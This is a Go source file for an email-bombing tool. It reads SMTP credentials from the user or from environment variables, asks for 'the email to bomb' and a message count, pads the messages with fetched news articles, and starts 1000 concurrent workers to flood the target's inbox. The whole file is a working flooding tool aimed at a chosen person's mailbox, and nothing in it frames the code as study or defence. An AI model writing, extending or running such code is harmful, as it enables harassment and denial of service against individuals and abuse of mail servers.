package bomber

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
	"sync"

	"github.com/fatih/color"
	"github.com/schollz/progressbar/v3"
	"gopkg.in/gomail.v2"
)

type SmtpOpts struct {
	Host     string
	Port     string
	Username string
	Password string
	Default  bool
}

func Bomber() {
	var smtpCreds SmtpOpts
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("want to use a default SMTP provided by the tool? Y/n :> ")
	rawSmtpChoice, _ := reader.ReadString('\n')
	trimmedSmtpChoice := strings.ToLower(strings.TrimSpace(rawSmtpChoice))
	if strings.Contains(trimmedSmtpChoice, "y") {
		smtpCreds = SmtpOpts{
			Host:     os.Getenv("SMTP_HOST"),
			Port:     os.Getenv("SMTP_PORT"),
			Username: os.Getenv("SMTP_USERNAME"),
			Password: os.Getenv("SMTP_PASSWORD"),
			Default:  true,
		}
	} else {
		var filteredCreds []string
		fmt.Println("Enter your SMTP Credentials. Format >  HOST,PORT,USERNAME,PASSWORD")
		fmt.Print(">>> ")
		rawSmtpCreds, _ := reader.ReadString('\n')
		splitedCreds := strings.Split(rawSmtpCreds, ",")
		for _, creds := range splitedCreds {
			trimmedCreds := strings.TrimSpace(creds)
			if len(trimmedCreds) != 0 {
				filteredCreds = append(filteredCreds, trimmedCreds)
			}
		}
		smtpCreds.Host = filteredCreds[0]
		smtpCreds.Port = filteredCreds[1]
		smtpCreds.Username = filteredCreds[2]
		smtpCreds.Password = filteredCreds[3]
		smtpCreds.Default = false
	}
	fmt.Println("verifying SMTP Credentials...")
	port, _ := strconv.Atoi(smtpCreds.Port)
	dialer := gomail.NewDialer(smtpCreds.Host, port, smtpCreds.Username, smtpCreds.Password)
	smtpConn, err := dialer.Dial()
	if err != nil {
		if smtpCreds.Default {
			fmt.Printf("err: %v\n", err)
			fmt.Printf("smtpCreds: %v\n", smtpCreds)
			fmt.Println("The default SMTP Credentials is dead :( Please use a custom SMTP.")
		} else {
			fmt.Printf("err: %v\n", err)
		}
		return
	}
	defer smtpConn.Close()

	var targetEmail string
	fmt.Print("Enter the email to bomb :> ")
	fmt.Scanln(&targetEmail)
	fmt.Print("Enter number of emails to send :> ")
	numEmails, _ := reader.ReadString('\n')
	numEmails = strings.TrimSpace(numEmails)
	numBombs, _ := strconv.Atoi(numEmails)

	maxWorkers := 1000
	var wg sync.WaitGroup
	var mutex sync.Mutex
	msgOpts := gomail.NewMessage()
	msgOpts.SetHeader("To", targetEmail)

	successBar := progressbar.NewOptions(numBombs,
		progressbar.OptionSetWriter(os.Stdout),
		progressbar.OptionShowCount(),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionSetDescription("Sent ->"),
		progressbar.OptionSetTheme(progressbar.Theme{
			Saucer:        "[green]=[reset]",
			SaucerHead:    "[green]>[reset]",
			SaucerPadding: " ",
			BarStart:      "[",
			BarEnd:        "]",
		}),
	)
	failsBar := progressbar.NewOptions(numBombs,
		progressbar.OptionSetWriter(os.Stdout),
		progressbar.OptionShowCount(),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionSetDescription("Fails ->"),
		progressbar.OptionSetTheme(progressbar.Theme{
			Saucer:        "[red]=[reset]",
			SaucerHead:    "[red]>[reset]",
			SaucerPadding: " ",
			BarStart:      "[",
			BarEnd:        "]",
		}),
	)

	fmt.Println("fetching news data...")
	body, err := GetMsgContent()
	if err != nil {
		fmt.Printf("err: %v\n", err)
		return
	}
	color.New(color.FgGreen).Println("Fetch was successful.")
	chunkSize := numBombs / maxWorkers

	if numBombs%maxWorkers != 0 {
		chunkSize++
	}

	workingChan := make(chan []int, chunkSize)
	articleChunks := make(chan Article, 1)
	distSlice := make([]int, numBombs)
	for i := 0; i < numBombs; i++ {
		distSlice[i] = i
	}

	for i := 0; i < maxWorkers; i++ {
		wg.Add(1)
		go SendMail(articleChunks, workingChan, &wg, &mutex, &smtpConn, msgOpts, &smtpCreds, successBar, failsBar)
	}

	articles := body.Articles
	for _, article := range articles {
		articleChunks <- article
	}
	close(articleChunks)

	for i := 0; i < numBombs; i += chunkSize {
		end := i + chunkSize
		if end > numBombs {
			end = numBombs
		}
		workingChan <- distSlice[i:end]
	}
	close(workingChan)

	wg.Wait()
	fmt.Println("\nall done!")

}
